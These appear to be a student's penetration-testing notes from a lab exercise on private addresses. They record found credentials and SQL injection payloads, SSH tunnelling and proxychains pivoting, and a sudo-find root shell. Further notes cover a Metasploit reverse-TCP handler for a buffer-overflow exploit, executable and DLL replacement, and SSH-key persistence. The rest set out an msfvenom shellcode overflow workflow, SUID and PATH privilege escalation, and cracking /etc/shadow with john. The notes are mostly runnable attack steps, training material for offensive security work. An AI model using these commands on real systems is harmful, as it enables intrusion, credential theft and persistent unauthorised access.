Dry Run OP Notes

IPs Used/Discovered: 
10.50.38.255 (PublicFacingWebsite) : 22,80
192.168.28.172 (RoundSensor) : 22
192.168.28.181 (WebApp) : 22,80
192.168.28.179 (Windows-Workstation) : 445,3389,9999
192.168.28.190

Users and Credentials Found: 
user2::EaglesIsARE78 
Lroth::anotherpassword4THEages
Aaron::apasswordyPa$$word

nmap scans to gather info: nmap -Pn -T4 -sT <WebSrvIP> -p22,80,8080,8888,4444,4242,2222
Open ports: All listed ports in scan
	
nc <WebSrvIP> <p#> to perform banner grabbing; confirmed 22 as SSH and 80 as HTTP
Open firefox and input IP for website

Try SQL "'OR 1='1 " (http://10.50.38.255/login.html); logged in as user Aaron
From source, look at Network requests for POST
Copy raw payload to URL; found credentials
Decode passwords using ROT13

http://10.50.38.255/apply.html appears to be an upload spot; nothing gained or found
http://10.50.38.255/getcareers.php?myfile=Systems_engineer.html; possible directory traversal  (File to read)

nmap -Pn -T4 -sT <WebSrvIP> --script http-enum.nse or nikto -h <WebSrvIP>; found /scripts/

Login to terminal using found credentials for user2

On PFW terminal:
whoami && hostname
bash
sudo -l
find / -type f -perm /<SUID,SGID, or both>; found nothing
ip a; nothing useful found
ip route; nothing seemingly useful
cat /etc/hosts
for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done

Found IPs:
192.168.28.181 (WebApp)
192.168.28.172

On lin-ops:
ssh -MS /tmp/T1 user2@<WebSrvIP>
ssh -S  /tmp/T1 -O forward -D 9050 DYNAMIC
sudo proxychains nmap -Pn -T4 -sT <FoundIPs> -p22,80,8080,8888,4444,4242,2222
All ports listed in scan open

proxychains nc <FoundIPs> <p#> to perform banner grabbing; confirmed 22 as SSH and 80 as HTTP

open firefox
use 127.0.0.1:8080

On WebApp webpage:
http://127.0.0.1:8080/pick.php?product=7%2OR%201=1 (Vulnerable Option)
http://127.0.0.1:8080/pick.php?product=7 UNION SELECT 1,2,3 
UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
UNION SELECT user_id,username,name FROM siteusers.users;# ; obtain credentials and decode

On PFW terminal:
Attempt to SSH to .181 using credentials; No user::cred works logging in

On lin-ops:
ssh -S /tmp/T1 -O forward -L <p#>:192.168.28.172:22 summ
ssh -MS /tmp/T2 Aaron@127.0.0.1

On new Round Sensor terminal:
whoami && hostname
bash
sudo -l
**GTFObins for anything found using sudo -l
sudo find . -exec /bin/bash \; -quit
whoami
ls -latr /root
cat /root/secret.obs
cat /root/ab.sh
ss -ntlp
cat /etc/hosts (Could also use  directory traversal)
for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done

Found IPs:
192.168.28.179
192.168.28.190

On lin-ops:
ssh -S /tmp/T1 -O cancel -D 9050 DYNAMIC
ssh -S /tmp/T2 -O forward -D 9050 DYN

sudo proxychains nmap -Pn -T4 -sT 192.168.28.179 -p445,3389,9999
All listed ports open

proxychains nc 192.168.28.179 <p#> to perform banner grabbing; confirmed 9999 as SecureServer

Set up Buffer Overflow:
On new Terminal, start msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444

ssh -S /tmp/T2 -O forward -L <p#>:192.168.28.179:9999 buffover
python <win_buffoverflow script> (No changes should be needed for this)

if 9999 doesn't work:
tunnel to 3389
xfreerdp /v:127.0.0.1:<p#> /u:Lroth /p:anotherpassword4THEages +dynamic-resolution +clipboard +glyph-cache
delete file if error

On Windows-Workstation:
Services app
File Explorer
check for blank or odd descriptions
double click for properties, go to path
If .dll, dll hijacking
if .exe, use said .exe

.exe Replacement:
Right click to rename the .exe; if you can rename, you can replace
rename to putty, place where putty goes
File Explorer, view name extensions and hidden items




More Notes:

Command Injection:
Access web shell:
	whoami
	ls -la /users/home/directory
On terminal:
	cat /etc/passwd
	ssh-keygen -t rsa
	echo "Public_Key" >> /users/home/directory/.ssh/authorized_keys
	ssh <TargetUser>@<TargetIP>
	
	
	
Exploit Development:
From Target:
	scp <host>@<TargetIP>:<TargetFilePath>  <jumphost>@<IP>:<DestFilePath>	
	
From host terminal:
	./<TargetFile> to manually overflow
	gdb <TargetFile>
	pdissass main
	pdisass <TargetFunction>
		
Create Overflow Script:
	overflow = "200Pattern"
	print (overflow)
	
	edit overflow to match offset (over flow = "A" * offset)
	eip = "B" * 4 (to confirm control of EIP)
	print (overflow + eip)
	
	Paste copied sample of EIP addresses
	eip = "\xaddr\xin\xreverse\xendian"
	add NOP sled (nop= '\x90' *10)
	Paste shellcode to script
	print (overflow + eip + nop + buf)
		
Host Terminal:
	gdb <TargetFile>
	run <<< $(python linbuff_script.py)
	Grab EIP for offset
	quit
	
	env - gdb <TargetFile>
	show env
	unset env LINES
	unset env COLUMNS
	run, then manually overflow
	info proc map
	find /b startofheap_addr,endofstack_addr,0xff(jump),0xe4(ESP)
	quit
	
	msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
	./<TargetFile> <<< $(python linbuff_script.py)
		
If script doesn't work:
	Regenerate shellcode
	if regenerated shellcode fails after a few attempts (8+), start over from the top (New EIP)
	
	
	
Reverse Engineering:
Open Ghidra
Import File
Open file in CodeBrowser
Change Hex values to Decimal, variables for more readable terms
Follow trail to right answer if running progam is not needed

>> = bit shift
2 >> 4 = 16
counter bit shift: 16 << 4



Windows/Linux PrivEsc,Persistence,Obfuscation:
Windows:
auditpol /get /category:* | findstr /i "success failure"
cmd runs asInvoker, right click  to run as admin
Persistence is Run Keys:
	HKLM/software/microsoft/windows
sigcheck -m C:<directory>
schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -CaseSensitive | select-string -pattern "COM Handler" -NotMatch

Linux:
rsyslog
/etc/passwd (not actually passwords)	

sudo -l

GTFOBins
	apt-get
sudo apt-get changelog apt
	#!/bin/bash
  
find / -type f =perm /2000 2>/dev/null (GUID set)
	chmod u+s /bin/bash
find / -type f =perm /4000 2>/dev/null (SUID set)
find / -type f =perm /6000 2>/dev/null (GUID+SUID set)

echo $PATH
PATH=.:$PATH

john:
needs /etc/shadow contents
target users are root or zeus

sudo apt install john
sudo cat /etc/shadow
mkdir && cd
echo "user info" > shadow.txt
john --wordlist=passwords.txt shadow.txt
john shadow.txt --show

sudo vim /etc/sudoers

touch -t 
